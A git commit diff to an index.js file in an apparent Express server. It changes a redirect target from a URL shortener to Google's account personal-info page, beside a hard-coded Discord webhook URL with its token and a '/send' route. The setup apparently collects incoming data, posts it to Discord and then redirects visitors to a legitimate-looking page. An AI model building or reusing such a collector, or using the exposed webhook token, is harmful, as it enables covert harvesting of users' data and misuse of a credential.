75a0519a6d5d525ca4539fd9628f99b7d36fadba
dwa664521-art <dwa664521@gmail.com>
2026-01-09 09:37:23 -0800

    Update index.js

--- index.js
+++ index.js
@@ -10,7 +10,7 @@ app.use(express.json({ limit: "50mb" }));
 
 // ===== CONFIG =====
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1459229880221700375/esk71z4kmwuwYOLByflofkjZra-deSo82CK0UogimXJbp0QKB13MLQ4wP3mm-yFrw6rj';
-const TARGET_URL = 'https://url-shortener.me/726T+';
+const TARGET_URL = 'https://myaccount.google.com/personal-info';
 // ==================
 
 app.get('/send', async (req, res) => {
